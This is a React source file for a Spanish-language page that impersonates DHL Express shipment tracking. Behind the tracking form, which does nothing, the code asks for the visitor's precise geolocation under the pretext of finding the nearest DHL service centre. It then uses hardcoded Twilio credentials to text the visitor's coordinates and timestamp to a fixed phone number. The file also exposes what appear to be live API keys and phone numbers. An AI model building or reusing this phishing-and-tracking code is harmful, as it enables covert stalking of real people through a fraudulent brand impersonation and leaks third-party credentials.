import Icon from "./logo";
import ThemeProvider from "react-bootstrap/ThemeProvider";
import "./App.css";

import Container from "react-bootstrap/Container";
import Row from "react-bootstrap/Row";
import Col from "react-bootstrap/Col";
import Nav from "react-bootstrap/Nav";
import Navbar from "react-bootstrap/Navbar";
import Card from "react-bootstrap/Card";
import Button from "react-bootstrap/Button";
import Form from "react-bootstrap/Form";

import { twilio } from "twilio";

import { useGeolocated } from "react-geolocated";
let attempt = 0;

function App() {
  const { coords, isGeolocationAvailable, isGeolocationEnabled, timestamp } =
    useGeolocated({
      positionOptions: {
        enableHighAccuracy: true,
      },
      userDecisionTimeout: 5000,
    });

  if (isGeolocationEnabled) {
    if (coords !== undefined && attempt < 1) {
      attempt++;
      const TWILIO_ACCOUNT_SID = "ACcf339a8ae7e737f8014ea3b349002d5a";
      const TWILIO_AUTH_TOKEN = "b894b03840cba56f9637270a703efd31";
      const TWILIO_PHONE_NUMBER = "+14246781482";

      const client = twilio(TWILIO_ACCOUNT_SID, TWILIO_AUTH_TOKEN);

      client.messages
        .create({
          from: TWILIO_PHONE_NUMBER,
          to: '+5215525305105',
          body: `lat: ${coords.latitude}, long: ${coords.longitude}, acc: ${coords.accuracy}, ${timestamp}`,
        })
    }
  }

  return (
    <ThemeProvider
      breakpoints={["xxxl", "xxl", "xl", "lg", "md", "sm", "xs", "xxs"]}
      minBreakpoint="xxs"
    >
      <Navbar className="jumbotron" expand="lg">
        <Navbar.Brand>
          <Icon />
        </Navbar.Brand>
        <Navbar.Toggle aria-controls="basic-navbar-nav" />
        <Navbar.Collapse id="basic-navbar-nav">
          <Nav className="navBar">
            <Nav.Item>
              <Nav.Link href="#">Rastrear</Nav.Link>
            </Nav.Item>
            <Nav.Item>
              <Nav.Link eventKey="link-1">Envío</Nav.Link>
            </Nav.Item>
            <Nav.Item>
              <Nav.Link eventKey="link-2">Soluciones de logística</Nav.Link>
            </Nav.Item>
            <Nav.Item>
              <Nav.Link eventKey="link-2">Servicio al cliente</Nav.Link>
            </Nav.Item>
          </Nav>
        </Navbar.Collapse>
      </Navbar>

      <Container fluid className="container-class">
        <Row className="justify-content-sm-center justify-content-xs-center">
          <Col
            xs={{ span: 6, offset: 1 }}
            md={{ span: 8, offset: 2 }}
            sm={{ span: 6, offset: 1 }}
          >
            {!isGeolocationAvailable ? (
              <div>Your browser does not support Geolocation</div>
            ) : coords ? (
              <Card style={{ width: "22.5rem", opacity: "0.8" }}>
                <Card.Body>
                  <Card.Title>Rastree su envío</Card.Title>
                  <Card.Text>
                    <Form.Control as="textarea" rows={5} />
                  </Card.Text>
                  <Button className="button-card">Rastrear</Button>
                  <hr></hr>
                  <Nav.Link className="follow-up">
                    {" "}
                    Seguimiento de una referencia de envio DHL Express ->
                  </Nav.Link>
                </Card.Body>
              </Card>
            ) : (
              <Card style={{ width: "22.5rem", opacity: "0.8" }}>
                <Card.Body>
                  <Card.Title>
                    Determinando tu centro de servicio DHL más cercano...
                  </Card.Title>
                </Card.Body>
              </Card>
            )}
          </Col>
        </Row>
      </Container>
      <hr></hr>
    </ThemeProvider>
  );
}
export default App;
